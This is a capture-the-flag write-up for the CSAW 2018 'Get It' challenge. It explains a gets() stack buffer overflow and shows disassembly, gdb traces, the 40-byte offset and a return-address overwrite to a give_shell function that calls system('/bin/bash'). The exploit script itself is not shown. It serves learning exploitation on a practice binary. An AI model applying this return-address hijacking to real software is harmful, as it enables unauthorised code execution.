# Csaw18 Get It

When you launch the binary you see a prompt with the question "Do you gets it?", with a buffer waiting for user input. I entered "yes" and the program exited:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Getit$ ./get_it
Do you gets it??
yes

```

From the question at the prompt I expect there to be an issue with the `gets` function in this binary. Let's take a look at the binary compilation security protections:

```bash
usage: pwn checksec [-h] [--file [elf ...]] [elf ...]
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Getit$ file get_it && checksec get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/CallFunction/Getit/get_it'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

```

From the output it looks like this is a 64-bit binary with NX enabled as the only protection. I'll take a look at the disassembly to get an idea of what is happening under the hood: 

```bash
gef➤  disass main
Dump of assembler code for function main:
   0x00000000004005c7 <+0>:	push   rbp
   0x00000000004005c8 <+1>:	mov    rbp,rsp
   0x00000000004005cb <+4>:	sub    rsp,0x30
   0x00000000004005cf <+8>:	mov    DWORD PTR [rbp-0x24],edi
   0x00000000004005d2 <+11>:	mov    QWORD PTR [rbp-0x30],rsi
   0x00000000004005d6 <+15>:	mov    edi,0x40068e
   0x00000000004005db <+20>:	call   0x400470 <puts@plt>
   0x00000000004005e0 <+25>:	lea    rax,[rbp-0x20]
   0x00000000004005e4 <+29>:	mov    rdi,rax
   0x00000000004005e7 <+32>:	mov    eax,0x0
   0x00000000004005ec <+37>:	call   0x4004a0 <gets@plt>
   0x00000000004005f1 <+42>:	mov    eax,0x0
   0x00000000004005f6 <+47>:	leave
   0x00000000004005f7 <+48>:	ret
End of assembler dump.

```

This is a very short program. We see:
- Initial args to main moved to rbp-0x24 and rbp-0x30
- The call to puts uses data from the binary at location 0x40068e
- The call to gets uses rbp-0x20 as the buffer where the input will be stored

At this point its clear we'll be able to overwrite the return address after sending 40 bytes + whatever address we provide. The question is what other functions exist in the binary? We could check this in Ghidra, but considering the binary is small enough we can just use Objdump: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/CallFunction/Getit$ objdump -M intel -d get_it

get_it:     file format elf64-x86-64


Disassembly of section .init:

0000000000400438 <_init>:
  400438:	48 83 ec 08          	sub    rsp,0x8
  40043c:	48 8b 05 b5 0b 20 00 	mov    rax,QWORD PTR [rip+0x200bb5]        # 600ff8 <__gmon_start__>
  400443:	48 85 c0             	test   rax,rax
  400446:	74 05                	je     40044d <_init+0x15>
  400448:	e8 63 00 00 00       	call   4004b0 <__gmon_start__@plt>
  40044d:	48 83 c4 08          	add    rsp,0x8
  400451:	c3                   	ret

------- SNIP -----------
00000000004005b6 <give_shell>:
  4005b6:	55                   	push   rbp
  4005b7:	48 89 e5             	mov    rbp,rsp
  4005ba:	bf 84 06 40 00       	mov    edi,0x400684
  4005bf:	e8 bc fe ff ff       	call   400480 <system@plt>
  4005c4:	90                   	nop
  4005c5:	5d                   	pop    rbp
  4005c6:	c3                   	ret
----- END SNIP ---------
```

When we look at the text section of the binary we can see another function named `give_shell` at 0x4005b6. This is what we needed! If we can overwrite the return address with this we'll solve the challenge. I'll test the theory by writing a python script and debugging the execution through gdb.



When we run the script with the payload breaking at main+46, we can see that the return address now holds 0x4005b6. 

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fff31916080  →  0x4141414141414141 ("AAAAAAAA"?)
$rbx   : 0x0
$rcx   : 0x00007f2469a1aaa0  →  0x00000000fbad2088
$rdx   : 0x1
$rsp   : 0x00007fff31916070  →  0x00007fff319161b8  →  0x00007fff31917400  →  "./get_it"
$rbp   : 0x00007fff319160a0  →  0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x1
$rdi   : 0x00007f2469a1ca80  →  0x0000000000000000
$rip   : 0x00000000004005f1  →  <main+002a> mov eax, 0x0
$r8    : 0x0
$r9    : 0x0
$r10   : 0x77
$r11   : 0x346
$r12   : 0x00007fff319161b8  →  0x00007fff31917400  →  "./get_it"
$r13   : 0x00000000004005c7  →  <main+0000> push rbp
$r14   : 0x0
$r15   : 0x00007f2469c49040  →  0x00007f2469c4a2e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────── stack ────
0x00007fff31916070│+0x0000: 0x00007fff319161b8  →  0x00007fff31917400  →  "./get_it"	 ← $rsp
0x00007fff31916078│+0x0008: 0x0000000100000000
0x00007fff31916080│+0x0010: 0x4141414141414141	 ← $rax
0x00007fff31916088│+0x0018: 0x4141414141414141
0x00007fff31916090│+0x0020: 0x4141414141414141
0x00007fff31916098│+0x0028: 0x4141414141414141
0x00007fff319160a0│+0x0030: 0x4141414141414141	 ← $rbp
0x00007fff319160a8│+0x0038: 0x00000000004005b6  →  <give_shell+0000> push rbp
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005e4 <main+001d>      mov    rdi, rax
     0x4005e7 <main+0020>      mov    eax, 0x0
     0x4005ec <main+0025>      call   0x4004a0 <gets@plt>
 →   0x4005f1 <main+002a>      mov    eax, 0x0
     0x4005f6 <main+002f>      leave
     0x4005f7 <main+0030>      ret
     0x4005f8                  nop    DWORD PTR [rax+rax*1+0x0]
     0x400600 <__libc_csu_init+0000> push   r15
     0x400602 <__libc_csu_init+0002> push   r14
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005f1 in main (), reason: TEMPORARY BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005f1 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/10gx $rsp
0x7fff31916070:	0x00007fff319161b8	0x0000000100000000
0x7fff31916080:	0x4141414141414141	0x4141414141414141
0x7fff31916090:	0x4141414141414141	0x4141414141414141
0x7fff319160a0:	0x4141414141414141	0x00000000004005b6
0x7fff319160b0:	0x0000000000000000	0x00000000004005c7
gef➤  info frame
Stack level 0, frame at 0x7fff319160b0:
 rip = 0x4005f1 in main; saved rip = 0x4005b6
 Arglist at 0x7fff319160a0, args:
 Locals at 0x7fff319160a0, Previous frame's sp is 0x7fff319160b0
 Saved registers:
  rbp at 0x7fff319160a0, rip at 0x7fff319160a8

```

If we continue to step through the instructions we can see that execution successfully moves into the the give_shell function. Unfortunately I did not get a shell, although this is the intended solution, but this is down to an issue with later Ubuntu versions (I'm on 22.04 LTS). The gbd trace upto the call to system is shown below:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0
$rbx   : 0x0
$rcx   : 0x000074536fa1aaa0  →  0x00000000fbad2088
$rdx   : 0x1
$rsp   : 0x00007ffc8ea44718  →  "AAAAAAAA"
$rbp   : 0x00007ffc8ea44718  →  "AAAAAAAA"
$rsi   : 0x1
$rdi   : 0x0000000000400684  →  "/bin/bash"
$rip   : 0x00000000004005bf  →  <give_shell+0009> call 0x400480 <system@plt>
$r8    : 0x0
$r9    : 0x0
$r10   : 0x77
$r11   : 0x346
$r12   : 0x00007ffc8ea44828  →  0x00007ffc8ea45400  →  "./get_it"
$r13   : 0x00000000004005c7  →  <main+0000> push rbp
$r14   : 0x0
$r15   : 0x000074536fc18040  →  0x000074536fc192e0  →  0x0000000000000000
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────── stack ────
0x00007ffc8ea44718│+0x0000: "AAAAAAAA"	 ← $rsp, $rbp
0x00007ffc8ea44720│+0x0008: 0x0000000000000000
0x00007ffc8ea44728│+0x0010: 0x00000000004005c7  →  <main+0000> push rbp
0x00007ffc8ea44730│+0x0018: 0x0000000100000000
0x00007ffc8ea44738│+0x0020: 0x00007ffc8ea44828  →  0x00007ffc8ea45400  →  "./get_it"
0x00007ffc8ea44740│+0x0028: 0x0000000000000000
0x00007ffc8ea44748│+0x0030: 0xab39c2c12fb9953b
0x00007ffc8ea44750│+0x0038: 0x00007ffc8ea44828  →  0x00007ffc8ea45400  →  "./get_it"
─────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4005b6 <give_shell+0000> push   rbp
     0x4005b7 <give_shell+0001> mov    rbp, rsp
     0x4005ba <give_shell+0004> mov    edi, 0x400684
 →   0x4005bf <give_shell+0009> call   0x400480 <system@plt>
   ↳    0x400480 <system@plt+0000> jmp    QWORD PTR [rip+0x200b9a]        # 0x601020 <system@got.plt>
        0x400486 <system@plt+0006> push   0x1
        0x40048b <system@plt+000b> jmp    0x400460
        0x400490 <__libc_start_main@plt+0000> jmp    QWORD PTR [rip+0x200b92]        # 0x601028 <__libc_start_main@got.plt>
        0x400496 <__libc_start_main@plt+0006> push   0x2
        0x40049b <__libc_start_main@plt+000b> jmp    0x400460
─────────────────────────────────────────────────────── arguments (guessed) ────
system@plt (
   $rdi = 0x0000000000400684 → "/bin/bash"
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "get_it", stopped 0x4005bf in give_shell (), reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4005bf → give_shell()
──────────────────────────────────────────────────────
```
